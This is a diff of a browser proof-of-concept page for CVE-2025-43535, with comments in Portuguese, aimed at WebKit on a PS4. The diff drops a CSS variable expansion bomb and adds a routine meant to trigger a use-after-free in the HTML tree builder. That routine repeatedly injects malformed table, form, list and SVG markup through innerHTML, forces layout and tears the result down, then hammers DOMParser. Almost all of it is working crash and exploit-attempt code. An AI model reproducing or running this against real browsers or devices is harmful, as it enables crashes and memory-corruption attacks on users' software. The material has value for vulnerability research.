@@ -1,18 +1,24 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — CSS Var Compression</title>
+<title>CVE-2025-43535 PoC — HTML Parser UAF</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
          height:320px; overflow-y:auto; font-size:12px; }
   .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+  
+  /* Estilos para forçar renderização complexa nos elementos bugados */
+  .stress { display: flex; float: left; position: relative; }
+  table { border-collapse: collapse; }
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption (CSS Var Expansion)</h3>
+<h3>CVE-2025-43535 — Memory Corruption (HTML Tree Builder)</h3>
 <div id="log"></div>
+<div id="sandbox" style="display:none;"></div>
 
 <script>
 "use strict";
@@ -22,67 +28,94 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-const yieldGC = () => new Promise(r => setTimeout(r, 100));
+// Respiro mínimo, o objetivo é causar condição de corrida (Race Condition) no parser
+const yieldRace = () => new Promise(r => setTimeout(r, 0));
 
-async function trigger_css_var_expansion() {
-  L("[V1] Iniciando Expansão por Variáveis CSS...");
+async function trigger_html_parser_uaf() {
+  L("[V2] Iniciando stress no HTML Tree Builder C++...");
+  const sandbox = document.getElementById('sandbox');
 
-  const el = document.createElement('div');
-  el.style.position = 'absolute';
-  document.body.appendChild(el);
+  // Padrões tóxicos que forçam os algoritmos de correção de erros do HTML5
+  const malformedPatterns = [
+    // 1. Foster Parenting extremo (Tags ilegais dentro de tabelas)
+    `<table>
+      <div class="stress">Orphan 1</div>
+      <tr>
+        <form><input></form>
+        <td>
+          <table><tr><div class="stress">Orphan 2</div><td>Inner</td></tr></table>
+        </td>
+      </tr>
+    </table>`,
 
-  // Define a base
-  el.style.setProperty('--v0', '15px');
-
-  // Nível 30 de expansão = 2^30 referências (Mais de 1 bilhão de nós no C++)
-  // O JavaScript gasta zero memória pra montar isso.
-  const max_depth = 30; 
-
-  L(`[V1] Montando a cadeia de referências até o nível ${max_depth}...`);
-  for (let i = 1; i <= max_depth; i++) {
-    // Cada variável chama a anterior duas vezes. 
-    // Ex: --v5 será min(var(--v4), var(--v4))
-    const prev = `var(--v${i-1})`;
+    // 2. Adoption Agency Algorithm (Tags de formatação cruzadas)
+    `<b><i><s><a href="#"><h1>Texto</b></i></s></a></h1>`,
     
-    // Alternamos as funções matemáticas para manter a complexidade do parser
-    const funcs = ['min', 'max', 'clamp'];
-    const f = funcs[i % 3];
+    // 3. Form in Form (O parser precisa "ignorar" o segundo form, mas manter o input)
+    `<form id="f1">
+      <input name="a">
+      <form id="f2">
+        <input name="b">
+      </form>
+    </form>`,
+
+    // 4. Misnested lists e misnested inlines com blocos
+    `<ul><li>A<ol><li>B</ul></li></ol>`,
+    `<span><p>Bloco dentro de inline forceja split</p></span>`,
     
-    let expr = '';
-    if (f === 'clamp') {
-      expr = `clamp(${prev}, ${i * 5}px, ${prev})`;
-    } else {
-      expr = `${f}(${prev}, ${prev})`;
+    // 5. SVG e MathML com foreign content mode (Muda a engine de parsing no meio)
+    `<table>
+      <svg><rect><foreignObject><div><table><tr><td>X</td></tr></table></div></foreignObject></rect></svg>
+    </table>`
+  ];
+
+  L("[V2] Bombardeando o DOM com padrões patológicos...");
+
+  // Martelamos a árvore 1000 vezes alterando a estrutura violentamente
+  for (let i = 0; i < 1000; i++) {
+    try {
+      // Pega um padrão aleatório
+      let pattern = malformedPatterns[i % malformedPatterns.length];
+      
+      // Multiplica o padrão algumas vezes para criar uma string média (segura para RAM, pesada para o parser)
+      let payload = pattern.repeat(20);
+
+      // Injeta no DOM via innerHTML (Invoca o HTMLFragmentParsingAlgorithm C++)
+      sandbox.innerHTML = payload;
+
+      // FORÇA O LAYOUT: Isso obriga o C++ a calcular as posições dos ponteiros agorinha mesmo, 
+      // enquanto a árvore pode estar num estado semi-corrompido
+      void sandbox.offsetWidth;
+
+      // Destrói imediatamente. Se o C++ agendou alguma tarefa de correção para o próximo frame,
+      // ele vai tentar acessar memória liberada (UAF).
+      sandbox.innerHTML = '';
+      void sandbox.offsetWidth;
+
+      if (i % 100 === 0) {
+        L(`[V2] Ciclos de mutação completos: ${i}/1000`);
+        await yieldRace();
+      }
+    } catch(e) {
+      // Ignoramos erros JS, queremos derrubar a engine C++
     }
-
-    el.style.setProperty(`--v${i}`, expr);
   }
 
-  L("[V1] Cadeia de variáveis montada no DOM. Tamanho no JS: Irrisório.", "ok");
-  await yieldGC();
-
-  L("[V1] ATENÇÃO: Disparando o gatilho no C++ do WebKit...");
-  await new Promise(r => requestAnimationFrame(r));
-
-  try {
-    // O momento da verdade. O Style Resolver do PS4 vai tentar calcular --v30
-    el.style.width = `var(--v${max_depth})`;
-    
-    // Força o cálculo síncrono
-    void el.offsetWidth; 
-    
-    L(`[V1] Sobreviveu à expansão máxima!`, "ok");
-  } catch(e) {
-    L(`[V1] Erro na resolução: ${e}`, "fail");
+  // Estágio final: DOMParser Assíncrono para causar confusão de threads
+  L("[V2] Iniciando stress de parsing assíncrono (DOMParser)...");
+  const parser = new DOMParser();
+  for (let i = 0; i < 500; i++) {
+    let doc = parser.parseFromString(`<!DOCTYPE html><html><body>${malformedPatterns[0]}</body></html>`, 'text/html');
+    void doc.body.innerHTML;
+    if (i % 100 === 0) await yieldRace();
   }
 
-  document.body.removeChild(el);
-  L("[V1] Teste de expansão finalizado.", "ok");
+  L("[V2] Teste finalizado. Se o WebKit tem vulnerabilidade no Tree Builder, o crash deve ter ocorrido.", "ok");
 }
 
 async function main() {
   try {
-    await trigger_css_var_expansion();
+    await trigger_html_parser_uaf();
     L("=== FIM DA EXECUÇÃO ===", "ok");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
